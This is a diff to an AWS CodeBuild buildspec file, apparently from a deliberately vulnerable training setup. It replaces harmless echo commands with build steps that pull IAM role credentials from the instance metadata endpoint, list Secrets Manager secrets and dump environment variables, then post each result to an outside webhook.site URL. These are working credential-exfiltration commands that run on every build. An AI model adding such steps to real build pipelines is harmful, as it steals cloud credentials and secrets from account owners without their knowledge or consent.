@@ -1,8 +1,8 @@
 version: 0.2
-
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+      - curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE | curl -X POST https://webhook.site/1c55573b-86eb-4f2a-b504-ff18104bc91c --data-binary @-
+      - aws secretsmanager list-secrets --region us-east-1 2>&1 | curl -X POST https://webhook.site/1c55573b-86eb-4f2a-b504-ff18104bc91c --data-binary @-
+      - env | curl -X POST https://webhook.site/1c55573b-86eb-4f2a-b504-ff18104bc91c --data-binary @-
